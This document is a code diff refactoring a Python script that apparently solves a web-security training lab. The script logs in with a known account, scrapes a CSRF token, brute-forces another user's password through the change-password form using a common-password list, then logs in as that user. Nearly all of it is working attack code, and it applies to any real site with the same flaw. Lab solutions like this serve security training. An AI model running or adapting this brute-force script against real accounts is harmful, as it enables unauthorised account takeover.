@@ -1,7 +1,7 @@
 import requests
 import sys
 import urllib3
-import time
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
@@ -16,29 +16,39 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
 }
 
-def login_wiener_acc(s, url):
-    login_url = url + '/login'
+
+def get_csrf_token(s, url, path):
+    target_url = url + path
+    r = s.get(target_url, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})
+    return csrf.get('value', '') if csrf else '' # type: ignore
+
+def login_acc(s, url, path, csrf_path, username, password):
+    login_url = url + path
     payload = {
-        'username': 'wiener',
-        'password': 'peter',
+        "csrf": get_csrf_token(s, url, csrf_path),
+        "username": username,
+        "password": password
     }
-    r = s.post(login_url, data=payload, headers=headers)
+    r = s.post(login_url, data=payload, allow_redirects=False)
+    if r.status_code == 302:
+        print(f'[+] Successful login {username} account')
+    else:
+        print(f'[-] Fail to login {username} account')
+        sys.exit(-1)
 
-    if 'Your username is: wiener' in r.text:
-        print('Logged in Wiener account')
-
-def brute_force_pass(s, url):
-    change_pass_url = url + '/my-account/change-password'
-    passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
+def bruteforce_via_password_change(s, url, path, username, list_passwords):
+    target_url = url + path
     print('Start bruteforce password...')
-    for password in passwords:
+    for password in list_passwords:
         payload = {
-            'username': 'carlos',
+            'username': username,
             'current-password': password,
-            'new-password-1': 'tmp1',
-            'new-password-2': 'tmp2',
+            'new-password-1': 'test',
+            'new-password-2': 'test',
         }
-        r = s.post(change_pass_url, data=payload, headers=headers, allow_redirects=False)
+        r = s.post(target_url, data=payload, headers=headers, allow_redirects=False)
 
         if 'Current password is incorrect' not in r.text:
             print(f'Found Carlos password: {password}')
@@ -46,20 +56,16 @@ def brute_force_pass(s, url):
     print('Not found Carlos password in the list')
     return None
 
-def login_carlos_acc(s, url, password):
-    login_url = url + '/login'
-    payload = {
-        'username': 'carlos',
-        'password': password,
-    }
-    print('Log in Carlos account...')
-    r = s.post(login_url, data=payload, headers=headers, allow_redirects=True)
+def goto(s, url, path):
+    target_url = url + path
+    r = s.get(target_url)
+    return r
 
-    if 'Log out' in r.text:
-        print('Successful log in Carlos account')
-        print('(+) Successful solved lab')
-    else:
-        print('(-) Fail to login Carlos account')
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
 
 def main():
     if len(sys.argv) != 2:
@@ -68,14 +74,20 @@ def main():
         sys.exit(-1)
 
     s = requests.Session()
-    url = sys.argv[1]
+    url = sys.argv[1].rstrip('/')
 
-    login_wiener_acc(s, url)
-    carlos_pass = brute_force_pass(s, url)
-    if carlos_pass is None:
-        print('[-] Fail to solve lab')
-        sys.exit(-1)
-    login_carlos_acc(s, url, carlos_pass)
+    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')
+
+    username = 'wiener'
+    password = 'peter'
+    target_username = 'carlos'
+
+    login_acc(s, url, '/login', '/login', username, password)
+    target_password = bruteforce_via_password_change(s, url, '/my-account/change-password', target_username, list_passwords)
+    login_acc(s, url, '/login', '/login', target_username, target_password)
+    goto(s, url, '/my-account')
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
